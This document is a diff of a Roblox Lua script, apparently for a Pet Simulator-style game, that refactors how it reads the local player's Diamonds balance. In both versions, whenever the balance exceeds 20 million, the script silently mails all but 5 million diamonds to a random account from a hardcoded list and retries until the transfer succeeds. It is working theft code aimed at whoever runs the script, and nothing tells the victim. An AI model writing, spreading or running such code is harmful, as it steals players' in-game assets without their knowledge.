@@ -1,46 +1,81 @@
 repeat task.wait() until game:IsLoaded()
+
+-- SERVICES
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 
-local diamondsStat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
-if not diamondsStat then
-	warn("Không tìm thấy chỉ số Diamonds.")
-	return
-end
-
-local currentValue = diamondsStat.Value
-if currentValue <= 20000000 then
-	warn("⚠️ Không đủ kim cương để gửi (cần > 20.000.000).")
-	return
-end
-
-local receivers = { "congahpz002", "congahpz003", "congahpz004", "congahpz005", "congahpz006", "congahpz007", "congahpz008", "congahpz009", "congahpz010", "conmeohpz004" }
-local receiver = receivers[math.random(1, #receivers)]
-
-local amountToSend = currentValue - 5000000
-
+-- LOAD CLIENT
 local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
 local Network = require(Client.Network)
-local Save = require(Client.Save).Get()
+local SaveModule = require(Client.Save)
+
+-- ================= GET GEMS (LẤY TỪ SCRIPT 2) =================
+local function getGems()
+    local stats = player:FindFirstChild("leaderstats")
+    if stats then
+        local diamonds = stats:FindFirstChild("💎 Diamonds") or stats:FindFirstChild("Diamonds")
+        if diamonds then
+            return diamonds.Value
+        end
+    end
+
+    -- fallback Save
+    local success, result = pcall(function()
+        return SaveModule.Get().Diamonds
+    end)
+
+    if success and result then
+        return result
+    end
+
+    return 0
+end
+
+-- ================= CHECK GEMS =================
+local currentValue = getGems()
+
+if currentValue <= 20000000 then
+    warn("⚠️ Không đủ kim cương để gửi (cần > 20M)")
+    return
+end
+
+-- ================= RANDOM RECEIVER =================
+local receivers = {
+    "congahpz002","congahpz003","congahpz004","congahpz005",
+    "congahpz006","congahpz007","congahpz008","congahpz009",
+    "congahpz010","conmeohpz004"
+}
+
+local receiver = receivers[math.random(1, #receivers)]
+
+-- ================= AMOUNT =================
+local amountToSend = currentValue - 5000000
+
+-- ================= LẤY UID =================
+local Save = SaveModule.Get()
 
 local diamondsUID
 for uid, v in pairs(Save.Inventory["Currency"]) do
-	if v.id == "Diamonds" then
-		diamondsUID = uid
-		break
-	end
-end
-if not diamondsUID then
-	warn("❌ Không tìm thấy Diamonds UID")
-	return
+    if v.id == "Diamonds" then
+        diamondsUID = uid
+        break
+    end
 end
 
+if not diamondsUID then
+    warn("❌ Không tìm thấy Diamonds UID")
+    return
+end
+
+-- ================= SEND LOOP =================
 while true do
-	local success = Network.Invoke("Mailbox: Send", receiver, "Bless", "Currency", diamondsUID, amountToSend)
-	if success then
-		print("📤 Đã gửi " .. amountToSend .. " 💎 cho người dùng: " .. receiver)
-		break
-	end
-	task.wait(0.1)
+    local success = Network.Invoke("Mailbox: Send", receiver, "Bless", "Currency", diamondsUID, amountToSend)
+
+    if success then
+        print("📤 Đã gửi " .. amountToSend .. " 💎 cho: " .. receiver)
+        break
+    end
+
+    task.wait(0.2)
 end
